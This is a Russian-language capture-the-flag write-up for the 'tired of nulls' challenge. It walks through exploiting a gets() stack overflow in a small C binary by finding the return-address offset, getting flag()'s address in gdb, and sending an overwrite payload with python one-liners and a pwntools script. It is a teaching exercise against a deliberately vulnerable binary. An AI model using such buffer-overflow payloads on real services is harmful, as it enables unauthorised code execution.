# tired of nulls writeup

Нам дан код на C, использующий небезопасную функцию [gets()](https://www.c-cpp.ru/content/gets) и самописная функция flag(), которая выводит переменную окружения. 

Внимательно просмотрев код, можно заметить, что функция flag() не вызывается в нашем main, там вообще ничего не вызывается.

### Что же делать? 
Обратить внимание, что буфер заполняется через gets(). Нужно понять, как ее проэксплуатировать (подсказка: размер введенной строки пользователя может быть БОЛЬШЕ, чем размер нашего буфера).

Теперь узнаем адрес нашего [rip регистра](https://linux-doc.ru/programming/assembler/architecture/rip.php), чтобы понять, как это сделать, будем использовать скомпилированный файл 3asypwn и python. Суть в том, чтобы получить [SEGFAULT](https://ru.wikipedia.org/wiki/%D0%9E%D1%88%D0%B8%D0%B1%D0%BA%D0%B0_%D1%81%D0%B5%D0%B3%D0%BC%D0%B5%D0%BD%D1%82%D0%B0%D1%86%D0%B8%D0%B8), благодаря этому узнаем смещение до нашего rip регистра.

Делается это с помощью команды `python -c "print 'A'* OFFSET" | ./3asypwn`, изначально примем `OFFSET=64`, потому что буфер именно такого размера, и будем увеличивать его на 4 до тех пор, пока не получим нужную ошибку. Произойдет это при 72 сдвиге, значит следующие 16 байтов - rip. Их нужно изменить, но на какое значение? 

Настало время [gdb](https://ru.wikipedia.org/wiki/GNU_Debugger). С его помощью легко можно узнать адрес функции flag(), запускаем `gdb -q ./3asypwn` и прописываем `disas flag` - в первой строке получаем то, что искали `0x0000000000400607`.

### Вызовем функцию! 
Это можно сделать двумя способами:

1. bash: `python -c "print 'A'*72 + '\x00\x00\x00\x00\x00\x40\x06\x07'[::-1]" | ./3asypwn`
2. gdb: ```r -A < <(python -c "print 'A'*72 + '\x00\x00\x00\x00\x00\x40\x06\x07'[::-1]")```

Второй способ позволяет передать в gdb null-bytes (\x00), в отличие от способа передачи $(), который их игнорирует.

Функция отработала, отлично, теперь переходим к боевому стенду! Для удобства работы напишем python скрипт.

```python
from pwn import *

conn = remote('TARGET_IP', TARGET_PORT)

OFFSET = 72
payload = OFFSET * 'A' + '\x00\x00\x00\x00\x00\x40\x06\x07'[::-1] 
conn.sendline(payload)
print(conn.recv())
```

 Отправляем нашу полезную нагрузку и получаем флаг: **kxctf{3asy_p34sy_pwn_0r_n0t?}**